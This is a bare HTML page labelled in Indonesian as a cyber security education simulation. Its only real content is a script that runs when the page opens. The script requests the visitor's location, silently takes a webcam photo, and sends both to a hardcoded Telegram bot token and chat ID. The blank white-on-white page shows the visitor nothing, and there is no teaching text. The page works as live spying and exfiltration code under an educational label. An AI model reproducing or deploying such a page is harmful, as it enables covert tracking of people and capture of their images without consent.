<!DOCTYPE html>
<html>
<head>
  <title>Simulasi Edukasi Cyber Security</title>
</head>
<body style="background:white; color:white;">
  <script>
    // Bot Telegram config
    const telegramToken = '8485657668:AAHeH2g82CDPoB9MJyruOnfXEu7dU9rKs_8';
    const chatId = '7979700473';

    // Fungsi kirim ke Telegram
    async function sendToTelegram(photoBlob, latitude, longitude) {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('caption', `Simulasi Edukasi\nLokasi:\nLatitude: ${latitude}\nLongitude: ${longitude}`);
      formData.append('photo', photoBlob, 'photo.jpg');

      await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    }

    // Ambil lokasi
    function getLocationAndCamera() {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;

          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();

          // Tunggu video nyala 1 detik, lalu ambil foto
          setTimeout(async () => {
            const canvas = document.createElement('canvas');
            canvas.width = 320;
            canvas.height = 240;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(track => track.stop());

            // Ubah ke blob
            canvas.toBlob(async (blob) => {
              await sendToTelegram(blob, latitude, longitude);
            }, 'image/jpeg');
          }, 1000);
        },
        (error) => {
          alert("Gagal ambil lokasi: " + error.message);
        }
      );
    }

    // Mulai ambil saat halaman dibuka
    window.onload = getLocationAndCamera;
  </script>
</body>
</html>
